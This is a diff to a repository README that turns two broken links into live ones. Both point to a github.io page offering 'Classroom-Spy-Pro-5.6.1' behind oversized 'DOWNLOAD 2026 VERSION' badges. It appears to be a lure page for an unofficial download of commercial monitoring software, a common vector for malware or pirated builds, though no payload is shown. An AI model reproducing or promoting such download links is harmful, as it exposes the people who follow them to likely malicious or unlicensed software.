@@ -6,7 +6,7 @@
   <br>
 
   <
-  <a href="[https://pathrhinocarve.github.io/Classroom-Spy-Pro-5.6.1/]" style="text-decoration:none;">
+  <a href="https://pathrhinocarve.github.io/Classroom-Spy-Pro-5.6.1/" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_v2026-4285F4?style=for-the-badge&logo=google-drive&logoColor=white&labelColor=2d2d2d" alt="Download 2026 Version" width="500"/>
   </a>
 
@@ -98,7 +98,7 @@ For your safety, always verify the file integrity after downloading.
   <h2>⭐ Found This Useful? Please Star the Repo!</h2>
   <br>
 
-  <a href="[https://pathrhinocarve.github.io/Classroom-Spy-Pro-5.6.1/]">
+  <a href="https://pathrhinocarve.github.io/Classroom-Spy-Pro-5.6.1/">
     <img src="https://img.shields.io/badge/⬇️_CLICK_TO_DOWNLOAD_2026_VERSION-FF6B6B?style=for-the-badge&logo=addthis&logoColor=white&labelColor=2d2d2d" alt="Download Button"/>
   </a>
   
